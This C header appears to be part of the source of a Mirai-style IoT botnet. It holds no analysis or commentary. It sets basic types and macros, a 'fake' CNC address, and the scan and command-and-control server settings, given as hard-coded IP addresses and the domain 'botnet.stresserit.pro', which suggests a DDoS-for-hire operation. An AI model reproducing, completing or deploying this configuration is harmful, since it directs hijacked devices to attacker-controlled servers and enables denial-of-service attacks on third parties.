#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define FALSE 0
#define TRUE 1

typedef char BOOL;

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

#define FAKE_CNC_ADDR INET_ADDR(46,17,42,41)
#define FAKE_CNC_PORT 23
/*                                                                 */
#ifndef USEDOMAIN
#define SCANIP (int)inet_addr((const char*)"35.158.115.42");
#define SERVIP (int)inet_addr((const char*)"35.158.115.42");

#else

#define SCANDOM "botnet.stresserit.pro"
#define SERVDOM "botnet.stresserit.pro"
#define SCANIP (int)inet_addr((const char*)"37.46.150.210");
#define SERVIP (int)inet_addr((const char*)"37.46.150.210");

#endif
/*                                                                 */   
ipv4_t LOCAL_ADDR;


